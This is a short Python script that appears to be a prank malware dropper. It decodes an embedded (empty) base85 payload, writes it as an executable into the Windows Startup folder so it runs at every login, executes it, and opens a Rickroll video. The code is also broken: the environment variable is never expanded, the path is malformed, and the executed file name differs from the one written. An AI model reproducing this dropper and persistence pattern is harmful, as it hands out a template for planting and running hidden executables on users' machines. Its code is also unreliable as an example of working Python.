from pathlib import Path
import os
import base64
import webbrowser

virus = ""
fileLoc = r"%APPDATA%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
decrypt = base64.b85decode(virus).decode("ascii")
with Path(os.path.join(fileLoc, "notavirus.exe")) as file:
    file.write_text(decrypt)
os.system(os.path.join(fileLoc, "notvirus.exe"))
url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
webbrowser.open(url)
